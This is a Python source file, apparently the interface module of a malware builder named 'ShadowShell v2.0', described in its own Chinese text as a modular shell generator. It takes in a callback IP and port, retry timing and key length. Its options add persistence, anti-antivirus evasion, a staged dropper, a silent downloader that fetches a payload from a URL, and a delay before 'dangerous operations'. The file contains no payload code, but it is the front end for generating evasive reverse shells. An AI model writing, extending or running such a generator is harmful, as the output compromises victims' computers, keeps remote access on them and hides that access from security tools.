# -*- coding: utf-8 -*-
"""
用户界面模块
提供交互式界面和命令行参数处理
"""
import argparse
from .utils import validate_ip, validate_port, print_banner


def interactive_mode():
    """交互式模式"""
    print_banner()
    print("\n请输入以下信息:")
    
    # 获取IP地址
    while True:
        ip = input("监听IP地址 >>> ").strip()
        if validate_ip(ip):
            break
        print("❌ IP地址格式不正确，请重新输入")
    
    # 获取端口
    while True:
        port = input("监听端口 >>> ").strip()
        if validate_port(port):
            port = int(port)
            break
        print("❌ 端口号不正确，请输入 1-65535 之间的数字")
    
    # 高级选项
    print("\n🔧 高级选项:")
    retry_count = input("连接重试次数 (默认: 10) >>> ").strip() or "10"
    retry_delay = input("重试间隔秒数 (默认: 5) >>> ").strip() or "5"
    key_length = input("密钥长度 (默认: 16) >>> ").strip() or "16"
    
    try:
        retry_count = int(retry_count)
        retry_delay = int(retry_delay)
        key_length = int(key_length)
    except ValueError:
        print("⚠️ 使用默认值")
        retry_count, retry_delay, key_length = 10, 5, 16
    
    # 输出选项
    output_dir = input("输出目录 (默认: 当前目录) >>> ").strip() or "."
    custom_filename = input("自定义文件名 (可选) >>> ").strip() or None
    
    add_persistence = input("添加持久化功能? (y/N) >>> ").strip().lower() == 'y'
    anti_detection = input("添加反杀毒特征? (Y/n) >>> ").strip().lower() != 'n'
    use_dropper = input("使用分阶段执行模式? (Y/n) >>> ").strip().lower() != 'n'
    
    # 新增：下载器选项
    use_downloader = input("生成下载器模式? (y/N) >>> ").strip().lower() == 'y'
    download_url = None
    downloader_silent = False
    
    if use_downloader:
        while True:
            download_url = input("下载地址 (主程序URL) >>> ").strip()
            if download_url and (download_url.startswith('http://') or download_url.startswith('https://')):
                break
            print("❌ 请输入有效的HTTP/HTTPS URL")
        
        downloader_silent = input("下载器静默模式? (Y/n) >>> ").strip().lower() != 'n'
    
    return {
        'ip': ip,
        'port': port,
        'retry': retry_count,
        'delay': retry_delay,
        'key_length': key_length,
        'output_dir': output_dir,
        'filename': custom_filename,
        'persistence': add_persistence,
        'anti_detection': anti_detection,
        'use_dropper': use_dropper,
        'use_downloader': use_downloader,
        'download_url': download_url,
        'downloader_silent': downloader_silent
    }


def command_line_mode():
    """命令行参数模式"""
    parser = argparse.ArgumentParser(description='ShadowShell v2.0 - 高级模块化Shell生成器')
    parser.add_argument('-i', '--ip', required=True, help='监听IP地址')
    parser.add_argument('-p', '--port', required=True, type=int, help='监听端口')
    parser.add_argument('-r', '--retry', default=10, type=int, help='连接重试次数')
    parser.add_argument('-d', '--delay', default=5, type=int, help='重试间隔')
    parser.add_argument('-k', '--key-length', default=16, type=int, help='密钥长度')
    parser.add_argument('-o', '--output', default='.', help='输出目录')
    parser.add_argument('-f', '--filename', help='自定义文件名')
    parser.add_argument('--persistence', action='store_true', help='添加持久化功能')
    parser.add_argument('--anti-detection', action='store_true', help='添加反杀毒特征')
    parser.add_argument('--use-dropper', action='store_true', help='使用分阶段执行模式')
    parser.add_argument('--use-downloader', action='store_true', help='生成下载器模式')
    parser.add_argument('--download-url', help='下载地址 (主程序URL)')
    parser.add_argument('--downloader-silent', action='store_true', help='下载器静默模式')
    parser.add_argument('--quiet', action='store_true', help='静默模式')
    parser.add_argument('--silent-delay', default=30, type=int, help='静默延迟时间（秒），在执行危险操作前等待')
    
    return parser.parse_args()
